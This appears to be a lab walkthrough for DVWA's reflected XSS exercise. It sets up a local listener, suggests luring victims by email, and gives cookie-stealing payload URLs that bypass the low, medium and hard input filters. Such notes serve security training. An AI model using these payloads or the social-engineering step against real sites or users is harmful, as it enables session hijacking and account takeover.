#Task - Refleced Cross site scripting(XSS): Steal the cookie of a logged in user.

#Since, we have to steal and get the cookie, we need to setup a server on which we will get the cookie.
#This can be done in the terminal by:
python -m http.server 1337
#1337 in this case is the port number to which we have to direct the cookie.
#We have to do social engineering(such as link through email) in order to send the link to the victim to get their cookie.

#Low difficulty - The input will not be validated or sanitised in any way. 
https://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=<script>window.location='http://127.0.0.1:1337/?cookie'+document.cookie</script>#
#This way we will get the cookie on the server we have made.

#Medium difficulty - Developer has added simple pattern matching to remove any references to "<script>". But it isn't case sensitive.
https://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=<SCRIPT>window.location='http://127.0.0.1:1337/?cookie'+document.cookie</SCRIPT>#
#Another way to do the same is: 
https://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=<scr<script>ipt>window.location='http://127.0.0.1:1337/?cookie'+document.cookie</script>#

#Hard difficulty - The developer has disabled all Javascript by removing pattern "<s*c*r*i*p*t>"
#Here we can use, img src instead on script. onerror will always be positive as we haven't mentioned a source.
https://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=<img src/onerror=window.location='http://127.0.0.1:1337/?cookie'+document.cookie>#
